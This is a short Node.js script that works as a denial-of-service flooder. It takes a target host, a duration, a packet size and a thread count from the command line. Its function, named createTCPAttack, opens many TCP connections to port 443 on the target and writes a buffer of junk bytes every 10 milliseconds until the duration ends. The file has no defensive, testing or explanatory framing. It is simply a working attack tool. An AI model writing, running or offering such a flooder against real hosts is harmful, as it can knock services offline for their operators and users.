const net = require('net');
const [,, host, time, packetSize, threads] = process.argv;

const duration = parseInt(time) * 1000;
const size = parseInt(packetSize);
const numThreads = parseInt(threads);

function createTCPAttack() {
  const client = new net.Socket();
  
  client.connect(443, host, () => {
    const interval = setInterval(() => {
      const data = Buffer.alloc(size, 'X');
      client.write(data);
    }, 10);

    setTimeout(() => {
      clearInterval(interval);
      client.end();
    }, duration);
  });

  client.on('error', (err) => {
    console.error(`Error: ${err.message}`);
  });
}

for (let i = 0; i < numThreads; i++) {
  createTCPAttack();
}
